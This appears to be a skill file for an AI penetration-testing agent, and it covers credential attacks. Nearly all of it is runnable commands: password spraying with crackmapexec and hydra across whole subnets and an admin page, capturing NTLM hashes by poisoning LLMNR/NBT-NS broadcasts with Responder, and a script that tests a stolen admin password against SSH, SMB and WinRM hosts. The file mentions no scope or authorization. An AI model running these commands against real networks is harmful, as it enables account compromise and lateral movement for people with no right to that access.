---
name: credential_attacks
description: Password spraying, NTLM hash capture, and credential reuse testing
---

# Credential Attacks

## Password Spraying

Test one password across many accounts to avoid lockout:

```bash
# SMB spray
crackmapexec smb 10.0.0.0/24 -u users.txt -p 'Company123' --continue-on-success

# SSH spray
crackmapexec ssh 10.0.0.0/24 -u users.txt -p 'Company123' --continue-on-success

# HTTP spray
hydra -L users.txt -p 'Company123' 10.0.1.50 http-get /admin
```

## NTLM Hash Capture

Capture authentication hashes on the local network:

```bash
# Start Responder (listens for LLMNR/NBT-NS broadcasts)
responder -I eth0 -wrf

# Capture hashes for 60 seconds
timeout 60 responder -I eth0 -wrf --analyze
```

## Credential Reuse

Test if credentials found on one system work on others:

```python
from aegis.tools.internal.credential_spray import test_credential_reuse

# Test credential across multiple services
targets = [
    {"host": "10.0.1.20", "service": "ssh"},
    {"host": "10.0.1.30", "service": "smb"},
    {"host": "10.0.1.40", "service": "winrm"},
]
results = await test_credential_reuse(
    {"username": "admin", "password": "P@ssw0rd"},
    targets
)
```
